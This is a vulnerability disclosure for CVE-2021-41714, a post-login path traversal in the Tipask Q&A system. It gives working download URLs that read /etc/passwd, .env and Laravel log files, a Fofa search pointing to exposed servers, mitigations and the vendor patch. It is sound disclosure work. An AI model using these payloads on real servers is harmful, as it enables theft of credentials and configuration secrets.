---
title: "CVE-2021-41714: Tipask PostAuth LFR"
slug: fza5hm
translationKey: fza5hm
date: 2021-09-23T12:49:45+08:00
source: yuque/penetration
---

# 1.Intro
1. Tipask: Tipask is an open source PHP Question&Answer system developed based on the Laravel framework that is easy to extend and has strong load capacity and stability.
2. Tipask < `3.5.9`, which fails to validate the path parameters entered by the user when downloading attachments, **a registered user can download arbitrary files on the Tipask server,** such as `.env`, `/etc/passwd`, `laravel.log` and so on, causing information leakage.
3. **This vulnerability is CREDITED to the following entity:**

```http
Qi'An Xin Technology Group, Network Security Department, Product-Security Team
```

## (1)Vendor
Official Site: [https://www.tipask.com/](https://www.tipask.com/)

Github Repo: [https://github.com/sdfsky/tipask](https://github.com/sdfsky/tipask)

Source code could be downloaded at: [https://www.tipask.com/release/Tipask_v3.5.8_UTF8_20210620.zip](https://www.tipask.com/release/Tipask_v3.5.8_UTF8_20210620.zip)



## (2)Description
+ Exploitation of the vulnerability needs an attacker to be logged in as a registered user. By successfully exploiting it, the attacker can download any file on the Tipask server,
+ Affected Version: `Tipask ≤ 3.5.8`
+ Fofa dork: [https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D](https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D)
    - 700+ tipask servers in the wild
+ CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
    - Score: 7.7 (High)
    - Type: Local File Read
+ Since the vendor has CONFIRMED this vulnerability in `2021/09/17`, and has patched it via commit [9b5f13](https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69), users are able to apply the patch to avoid this vuln.



---

# 2.PoC & EXP
Once you've registered and logged in, you can access the following address directly:

## PoC
For Linux Server, the PoC is as follows

```http
http://tipask/attach/download/..-..-..-..-..-..-..-etc-hosts
```



## EXP
```http
https://tipask/attach/download/..-..-.env
https://tipask/attach/download/..-logs-laravel.log
https://tipask/attach/download/..-..-..-..-..-..-..-etc-passwd
```

The vulnerability involves 1 file:

`app\Http\Controllers\AttachController.php`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631778109392-4b3e80b4-081a-4933-9e02-1b76e24e7085.png)

path traversal due to no param-check.



Here is sensitive information that's downloaded via the vuln.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632374598362-630264a0-9412-4857-8425-cab79be2b0c2.png)




Of course, mitigations are easy to apply:

+ limiting the directories to be read, such as using `basename()` to process the user's input parameters
+ User input parameters are prohibited to contain `..`



The vendor has CONFIRMED this vulnerability in `2021/09/17`, and has patched it via commit [9b5f13](https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69), users are able to apply the patch to avoid this vuln.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632374757916-921b7066-aa3c-4218-9519-5e0403a0a221.png)

---

# 3.Reference:
+ Code affected: [app/Http/Controllers/AttachController.php#L42](https://github.com/sdfsky/tipask/blob/c4e6aa9f6017c9664780570016954c0922d203b7/app/Http/Controllers/AttachController.php#L42)
+ Patch: [https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69](https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69)
